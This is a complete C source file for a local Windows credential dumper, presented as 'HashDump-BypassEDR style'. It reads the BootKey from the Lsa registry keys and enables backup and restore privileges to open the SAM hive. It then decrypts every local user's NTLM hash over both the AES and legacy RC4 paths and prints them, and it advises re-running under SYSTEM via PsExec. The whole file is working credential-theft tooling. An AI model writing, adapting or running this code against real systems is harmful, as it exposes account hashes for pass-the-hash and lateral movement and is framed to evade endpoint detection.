/*
 * hashdump.c - single-file local SAM dumper
 *
 * Build:
 *   cl /nologo /W3 /O2 hashdump.c /link advapi32.lib bcrypt.lib
 *
 * Run:
 *   hashdump.exe                 - any user, prints BootKey only
 *   (Admin) hashdump.exe         - dumps all NTLM hashes (uses BACKUP priv)
 *   (SYSTEM) hashdump.exe        - same, no priv tricks needed
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")

/* ----- magic constants from samsrv.dll ----- */
static const BYTE g_perm[16] = {
    0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3,
    0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7
};
static const char g_aqwerty[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
static const char g_anum[]    = "0123456789012345678901234567890123456789";
static const char g_ntpw[]    = "NTPASSWORD";

/* ----- helpers ----- */
static BYTE hex_nib(wchar_t c) {
    if (c >= L'0' && c <= L'9') return (BYTE)(c - L'0');
    if (c >= L'a' && c <= L'f') return (BYTE)(c - L'a' + 10);
    if (c >= L'A' && c <= L'F') return (BYTE)(c - L'A' + 10);
    return 0;
}
static void hex_print(const char* tag, const BYTE* d, size_t n) {
    printf("[+] %-10s ", tag);
    for (size_t i = 0; i < n; i++) printf("%02x", d[i]);
    printf("\n");
}

/* ----- BCrypt thin wrappers ----- */
static BOOL bc_md5(const BYTE* p1, ULONG l1, const BYTE* p2, ULONG l2,
                   const BYTE* p3, ULONG l3, const BYTE* p4, ULONG l4,
                   BYTE out[16]) {
    BCRYPT_ALG_HANDLE  alg = NULL;
    BCRYPT_HASH_HANDLE h   = NULL;
    BOOL ok = FALSE;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_MD5_ALGORITHM, NULL, 0) == 0 &&
        BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0) == 0)
    {
        BCryptHashData(h, (PUCHAR)p1, l1, 0);
        if (p2) BCryptHashData(h, (PUCHAR)p2, l2, 0);
        if (p3) BCryptHashData(h, (PUCHAR)p3, l3, 0);
        if (p4) BCryptHashData(h, (PUCHAR)p4, l4, 0);
        BCryptFinishHash(h, out, 16, 0);
        ok = TRUE;
    }
    if (h)   BCryptDestroyHash(h);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}
static BOOL bc_rc4(const BYTE* key, ULONG kl, BYTE* buf, ULONG bl) {
    BCRYPT_ALG_HANDLE alg = NULL; BCRYPT_KEY_HANDLE k = NULL;
    BOOL ok = FALSE; ULONG cb;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_RC4_ALGORITHM, NULL, 0) == 0 &&
        BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, kl, 0) == 0)
    {
        BCryptEncrypt(k, buf, bl, NULL, NULL, 0, buf, bl, &cb, 0);
        ok = TRUE;
    }
    if (k)   BCryptDestroyKey(k);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}
static BOOL bc_aes_cbc(const BYTE key[16], const BYTE iv[16], BYTE* buf, ULONG bl) {
    BCRYPT_ALG_HANDLE alg = NULL; BCRYPT_KEY_HANDLE k = NULL;
    BOOL ok = FALSE; ULONG cb; BYTE iv_copy[16];
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        if (BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 16, 0) == 0) {
            memcpy(iv_copy, iv, 16);
            BCryptDecrypt(k, buf, bl, NULL, iv_copy, 16, buf, bl, &cb, 0);
            ok = TRUE;
        }
    }
    if (k)   BCryptDestroyKey(k);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}
static BOOL bc_des(const BYTE key[8], BYTE block[8]) {
    BCRYPT_ALG_HANDLE alg = NULL; BCRYPT_KEY_HANDLE k = NULL;
    BOOL ok = FALSE; ULONG cb;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_DES_ALGORITHM, NULL, 0) == 0) {
        BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
                          sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
        if (BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 8, 0) == 0) {
            BCryptDecrypt(k, block, 8, NULL, NULL, 0, block, 8, &cb, 0);
            ok = TRUE;
        }
    }
    if (k)   BCryptDestroyKey(k);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

/* ============================================================
   STEP 1.  BootKey from Lsa class names.  Works as ANY user.
   ============================================================ */
static BOOL get_bootkey(BYTE bootkey[16]) {
    static const wchar_t* subs[4] = { L"JD", L"Skew1", L"GBG", L"Data" };
    BYTE raw[16] = {0};
    for (int i = 0; i < 4; i++) {
        wchar_t path[256];
        wsprintfW(path, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s", subs[i]);
        HKEY hk;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0,
                          KEY_READ | KEY_WOW64_64KEY, &hk) != ERROR_SUCCESS) {
            printf("[-] RegOpenKeyEx Lsa\\%ls failed (%lu)\n",
                   subs[i], GetLastError());
            return FALSE;
        }
        wchar_t cls[64] = {0};
        DWORD cls_size = (DWORD)(sizeof(cls) / sizeof(wchar_t));
        LONG rc = RegQueryInfoKeyW(hk, cls, &cls_size,
                                   NULL, NULL, NULL, NULL,
                                   NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hk);
        if (rc != ERROR_SUCCESS || cls_size != 8) {
            printf("[-] RegQueryInfoKey Lsa\\%ls (rc=%ld len=%lu)\n",
                   subs[i], rc, cls_size);
            return FALSE;
        }
        for (int j = 0; j < 4; j++)
            raw[i*4 + j] = (BYTE)((hex_nib(cls[j*2]) << 4) | hex_nib(cls[j*2 + 1]));
    }
    for (int i = 0; i < 16; i++) bootkey[i] = raw[g_perm[i]];
    return TRUE;
}

/* ============================================================
   STEP 2.  Enable SeBackupPrivilege + SeRestorePrivilege.
   ============================================================ */
static BOOL enable_priv(LPCWSTR name) {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid)) {
        CloseHandle(tok);
        return FALSE;
    }
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(tok);
    return err == ERROR_SUCCESS;
}

static LONG open_backup(HKEY root, LPCWSTR sub, HKEY* out) {
    DWORD disp;
    return RegCreateKeyExW(root, sub, 0, NULL,
                           REG_OPTION_BACKUP_RESTORE,
                           KEY_READ | KEY_WOW64_64KEY,
                           NULL, out, &disp);
}

/* ============================================================
   STEP 3.  HBootKey from SAM\SAM\Domains\Account[F].
   ============================================================ */
static BOOL get_hbootkey(const BYTE bootkey[16],
                         BYTE hbootkey[16],
                         BOOL* outIsAes)
{
    HKEY hk;
    LONG rc = open_backup(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account", &hk);
    if (rc != ERROR_SUCCESS) {
        printf("[-] open SAM\\Domains\\Account = %ld\n", rc);
        return FALSE;
    }
    BYTE F[1024];
    DWORD F_len = sizeof F;
    rc = RegQueryValueExW(hk, L"F", NULL, NULL, F, &F_len);
    RegCloseKey(hk);
    if (rc != ERROR_SUCCESS) {
        printf("[-] read F = %ld\n", rc);
        return FALSE;
    }

    /* DOMAIN_ACCOUNT_F header = 120 bytes (0x78).
       SAM_KEY_DATA (RC4, rev==2) or SAM_KEY_DATA_AES (AES, rev>=3). */
    BYTE rev = F[0];
    *outIsAes = (rev >= 3);

    if (*outIsAes) {
        /* SAM_KEY_DATA_AES at offset 0x78:
           +0  Revision(4) +4 Length(4) +8 Salt/IV(16) +24 Data(Length) */
        if (F_len < 0x78 + 24 + 32) {
            printf("[-] F too small for AES (%lu)\n", F_len);
            return FALSE;
        }
        BYTE iv[16]; memcpy(iv, F + 0x78 + 8, 16);
        BYTE buf[32]; memcpy(buf, F + 0x78 + 24, 32);
        if (!bc_aes_cbc(bootkey, iv, buf, 32)) return FALSE;
        memcpy(hbootkey, buf, 16);
    } else {
        /* Legacy: salt at 0x70, encrypted blob at 0x80. */
        if (F_len < 0xA0) {
            printf("[-] F too small for RC4 (%lu)\n", F_len);
            return FALSE;
        }
        BYTE rc4key[16];
        if (!bc_md5(F + 0x70,         16,
                    (BYTE*)g_aqwerty, sizeof(g_aqwerty) - 1,
                    bootkey,          16,
                    (BYTE*)g_anum,    sizeof(g_anum) - 1,
                    rc4key))
            return FALSE;
        BYTE buf[32]; memcpy(buf, F + 0x80, 32);
        if (!bc_rc4(rc4key, 16, buf, 32)) return FALSE;
        memcpy(hbootkey, buf, 16);
    }
    return TRUE;
}

/* ============================================================
   STEP 4.  RID -> two DES keys.
   ============================================================ */
static void str_to_key(const BYTE in7[7], BYTE out8[8]) {
    out8[0] =   in7[0] >> 1;
    out8[1] = ((in7[0] & 0x01) << 6) | (in7[1] >> 2);
    out8[2] = ((in7[1] & 0x03) << 5) | (in7[2] >> 3);
    out8[3] = ((in7[2] & 0x07) << 4) | (in7[3] >> 4);
    out8[4] = ((in7[3] & 0x0F) << 3) | (in7[4] >> 5);
    out8[5] = ((in7[4] & 0x1F) << 2) | (in7[5] >> 6);
    out8[6] = ((in7[5] & 0x3F) << 1) | (in7[6] >> 7);
    out8[7] =   in7[6] & 0x7F;
    for (int i = 0; i < 8; i++) out8[i] = (BYTE)((out8[i] << 1) & 0xFE);
}
static void rid_to_des_keys(DWORD rid, BYTE k1[8], BYTE k2[8]) {
    BYTE r[4];
    *(DWORD*)r = rid;
    BYTE p1[7] = { r[0], r[1], r[2], r[3], r[0], r[1], r[2] };
    BYTE p2[7] = { r[3], r[0], r[1], r[2], r[3], r[0], r[1] };
    str_to_key(p1, k1);
    str_to_key(p2, k2);
}

/* ============================================================
   STEP 5.  Decrypt one user's NT hash blob.
   ============================================================ */
static BOOL decrypt_nthash(const BYTE hbootkey[16], BOOL isAes,
                           DWORD rid, const BYTE* blob, DWORD blen,
                           BYTE nthash[16])
{
    BYTE inner[16];

    if (isAes) {
        /* SAM_HASH_AES: PekID(2)+Rev(2)+DataOff(4)+Salt(16)+Hash(16+) */
        if (blen < 24 + 16) {
            memcpy(nthash,
                   "\x31\xd6\xcf\xe0\xd1\x6a\xe9\x31"
                   "\xb7\x3c\x59\xd7\xe0\xc0\x89\xc0", 16);
            return TRUE;
        }
        BYTE iv[16]; memcpy(iv, blob + 8, 16);
        memcpy(inner, blob + 24, 16);
        if (!bc_aes_cbc(hbootkey, iv, inner, 16)) return FALSE;
    } else {
        /* Legacy: 4-byte header + 16 bytes RC4-encrypted */
        if (blen < 20) return FALSE;
        BYTE rc4key[16];
        DWORD rid_le = rid;
        if (!bc_md5(hbootkey,        16,
                    (BYTE*)&rid_le,  sizeof rid_le,
                    (BYTE*)g_ntpw,   (ULONG)sizeof(g_ntpw),
                    NULL,            0,
                    rc4key))
            return FALSE;
        memcpy(inner, blob + 4, 16);
        if (!bc_rc4(rc4key, 16, inner, 16)) return FALSE;
    }

    /* Outer DES wrapping */
    BYTE k1[8], k2[8];
    rid_to_des_keys(rid, k1, k2);
    BYTE half1[8], half2[8];
    memcpy(half1, inner,     8);
    memcpy(half2, inner + 8, 8);
    if (!bc_des(k1, half1)) return FALSE;
    if (!bc_des(k2, half2)) return FALSE;
    memcpy(nthash,     half1, 8);
    memcpy(nthash + 8, half2, 8);
    return TRUE;
}

/* ============================================================
   STEP 6.  Walk SAM\SAM\Domains\Account\Users.
   ============================================================ */
static BOOL dump_users(const BYTE hbootkey[16], BOOL isAes) {
    HKEY hUsers;
    LONG rc = open_backup(HKEY_LOCAL_MACHINE,
        L"SAM\\SAM\\Domains\\Account\\Users", &hUsers);
    if (rc != ERROR_SUCCESS) {
        printf("[-] open Users = %ld\n", rc);
        return FALSE;
    }

    printf("\n    %-20s %-6s %s\n", "USER", "RID", "NTLM");
    printf("    -------------------- ------ --------------------------------\n");

    for (DWORD idx = 0; ; idx++) {
        wchar_t name[64];
        DWORD name_len = (DWORD)(sizeof(name) / sizeof(wchar_t));
        rc = RegEnumKeyExW(hUsers, idx, name, &name_len,
                           NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS) continue;
        if (name_len != 8) continue;
        DWORD rid = wcstoul(name, NULL, 16);

        HKEY hUser;
        if (open_backup(hUsers, name, &hUser) != ERROR_SUCCESS) continue;

        BYTE V[8192];
        DWORD V_len = sizeof V;
        rc = RegQueryValueExW(hUser, L"V", NULL, NULL, V, &V_len);
        RegCloseKey(hUser);
        if (rc != ERROR_SUCCESS || V_len < 0xCC) continue;

        /* USER_ACCOUNT_V layout - offsets relative to V + 0xCC */
        DWORD un_off = *(DWORD*)(V + 0x0C);
        DWORD un_len = *(DWORD*)(V + 0x10);
        DWORD nh_off = *(DWORD*)(V + 0xA8);
        DWORD nh_len = *(DWORD*)(V + 0xAC);

        wchar_t uname[128] = {0};
        if (un_len > 0 && un_len < sizeof(uname) - 2 &&
            (DWORD)0xCC + un_off + un_len <= V_len)
        {
            memcpy(uname, V + 0xCC + un_off, un_len);
        }

        BYTE nthash[16] = {0};
        BOOL got = FALSE;
        if (nh_len > 0 && (DWORD)0xCC + nh_off + nh_len <= V_len) {
            got = decrypt_nthash(hbootkey, isAes, rid,
                                 V + 0xCC + nh_off, nh_len, nthash);
        }

        printf("    %-20ls %-6lu ", uname, rid);
        if (got) for (int i = 0; i < 16; i++) printf("%02x", nthash[i]);
        else     printf("<empty / decrypt failed>");
        printf("\n");
    }
    RegCloseKey(hUsers);
    return TRUE;
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    BYTE bootkey[16], hbootkey[16];
    BOOL isAes = FALSE;

    printf("[*] HashDump-BypassEDR style local SAM dumper\n\n");

    /* Stage 1 - works without any privileges */
    if (!get_bootkey(bootkey)) {
        printf("[-] BootKey extraction failed\n");
        return 1;
    }
    hex_print("BootKey", bootkey, 16);

    /* Stage 2 - try to elevate access to SAM */
    BOOL bk = enable_priv(L"SeBackupPrivilege");
    BOOL re = enable_priv(L"SeRestorePrivilege");
    if (!bk || !re) {
        printf("\n[!] Cannot enable SeBackup/SeRestore -> not running as Admin.\n"
               "[!] HKLM\\SAM is not reachable from this token.\n"
               "[i] Re-run elevated, ideally under SYSTEM:\n"
               "[i]   PsExec64.exe -accepteula -s -i cmd.exe   (Sysinternals)\n");
        return 0;
    }

    /* Stage 3 - derive HBootKey and dump every user */
    if (!get_hbootkey(bootkey, hbootkey, &isAes)) return 1;
    hex_print("HBootKey", hbootkey, 16);
    printf("[*] SAM revision: %s\n", isAes ? "AES (Win10+)" : "RC4 (legacy)");

    if (!dump_users(hbootkey, isAes)) return 1;
    return 0;
}
